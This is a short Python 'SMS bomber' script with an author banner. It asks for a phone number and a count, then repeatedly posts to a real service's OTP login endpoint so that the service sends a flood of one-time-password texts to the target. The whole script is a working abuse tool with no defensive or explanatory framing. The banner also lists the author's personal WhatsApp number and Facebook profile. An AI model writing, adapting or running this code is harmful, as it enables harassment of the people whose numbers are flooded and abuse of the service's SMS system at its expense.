import requests
from requests.structures import CaseInsensitiveDict

print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n")
print("☞ Auther     : Hasib420 ")
print("☞ WhatsApp   : +8801864186795")
print("☞ Facebook I'd   :https://www.facebook.com/profile.php?id=100044107367152")
print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n")

number=str(input("Enter Your Number:"))
amount=int(input("Enter Your Amount:"))

url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number

for j in range(amount):

	resp = requests.post(url, headers=headers, data=data)


print(str(j+1)+"sms sent")

